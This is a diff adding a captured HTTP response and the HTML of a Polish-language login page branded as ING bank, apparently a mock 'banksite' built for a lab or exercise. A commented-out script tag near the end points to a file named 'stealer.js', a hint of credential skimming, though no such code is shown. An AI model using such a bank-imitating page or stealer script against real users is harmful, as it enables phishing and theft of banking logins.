@@ -1,0 +1,100 @@
+HTTP/1.1 200 OK
+Date: Wed, 12 Dec 2018 13:07:23 GMT
+Server: WSGIServer/0.2 CPython/3.6.7
+Content-Type: text/html; charset=utf-8
+Expires: Wed, 12 Dec 2018 13:07:23 GMT
+Cache-Control: max-age=0, no-cache, no-store, must-revalidate
+Vary: Cookie
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3911
+Set-Cookie: csrftoken=njXXYruj2I3e0DZpa3ON1pXPyWe7j4psmGGhWvvVA8aTFK8KZ52DqLE79a2VfrDS; expires=Wed, 11 Dec 2019 13:07:23 GMT; Max-Age=31449600; Path=/; SameSite=Lax
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+	 <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+    <link rel="stylesheet" type="text/css" href="/static/banksite/main.css">
+
+	
+		<title>ING</title>
+	
+</head>
+<body>
+	<div class="main-header">
+		<header class="site-header">
+		  <nav class="navbar navbar-expand-md navbar-dark bg-steel fixed-top">
+		    <div class="container">
+					
+					<img class="logo" src="/static/banksite/ing.png"/>
+		      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle" aria-controls="navbarToggle" aria-expanded="false" aria-label="Toggle navigation">
+		      <span class="navbar-toggler-icon"></span>
+		      </button>
+		      <div class="collapse navbar-collapse" id="navbarToggle">
+		        <div class="navbar-nav mr-auto">
+		          <a class="nav-item nav-link" href="/">Strona główna</a>
+		          <a class="nav-item nav-link" href="/about/">O nas</a>
+		        </div>
+		        <!-- Navbar Right Side -->
+		        <div class="navbar-nav">
+		        	
+				        <a class="nav-item nav-link" href="/login/">Logowanie</a>
+				        <a class="nav-item nav-link" href="/register/">Rejestracja</a>
+			        
+		        </div>
+		      </div>
+		    </div>
+		  </nav>
+		</header>
+	</div>
+
+	<main role="main" class="main-cont">
+	  <div class="row">
+	    <div class="col-md-12">
+	    	
+	      	
+	<div class="content-section">
+		<form method="POST">
+			<input type="hidden" name="csrfmiddlewaretoken" value="U4fIX6RGZgs6vlN4RzCxM7Ti61o5nTE2TrY2VaSixGzLasWpGBQnbtAAHfcTjgSs">
+			<fieldset class="form-group">
+				<legend class="border-bottom mb-4">Logowanie</legend>
+				
+
+<div id="div_id_username" class="form-group"> <label for="id_username" class="col-form-label  requiredField">
+                Username<span class="asteriskField">*</span> </label> <div class=""> <input type="text" name="username" autofocus class="textinput textInput form-control" required id="id_username"> </div> </div> <div id="div_id_password" class="form-group"> <label for="id_password" class="col-form-label  requiredField">
+                Password<span class="asteriskField">*</span> </label> <div class=""> <input type="password" name="password" class="textinput textInput form-control" required id="id_password"> </div> </div>
+
+			</fieldset>
+			<div class="form-group">
+                <button class="btn btn-outline-info" type="submit">Zaloguj</button>
+                <small class="text-muted ml-2">
+                	<a href="/password-reset/">Zapomniałeś hasła?</a>
+                </small>
+            </div>
+		</form>
+		<div class="border-top pt-3">
+            <small class="text-muted">
+                Nie masz jeszce konta? <a class="ml-2" href="/register/">Załóż je</a>
+            </small>
+
+        </div>
+	</div>
+
+	    </div>
+	  </div>
+	</main>
+	<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+		<!--script src="/static/js/stealer.js"></script-->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+</html>
